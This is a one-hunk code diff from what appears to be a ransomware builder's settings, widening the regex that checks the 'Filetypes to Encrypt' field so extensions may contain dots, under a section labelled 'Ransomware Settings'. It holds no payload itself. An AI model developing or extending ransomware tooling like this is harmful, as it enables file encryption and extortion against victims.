@@ -210,7 +210,7 @@ BUILDER_CONFIG_ITEMS = OrderedDict([
             "label": "Filetypes to Encrypt",
             "label_object_name": "FiletypesToEncryptLabel",
             "input_object_name": "FiletypesToEncryptTextCtrl",
-            "regex": re.compile("^([A-Za-z0-9]+(,[A-Za-z0-9]+)*)?$"),
+            "regex": re.compile("^([A-Za-z0-9.]+(,[A-Za-z0-9.]+)*)?$"),
             "example": "pdf,exe,msi,doc",
             "input_requirement": "A comma-separated list of filetypes to encrypt",
             "config_area": "Ransomware Settings",
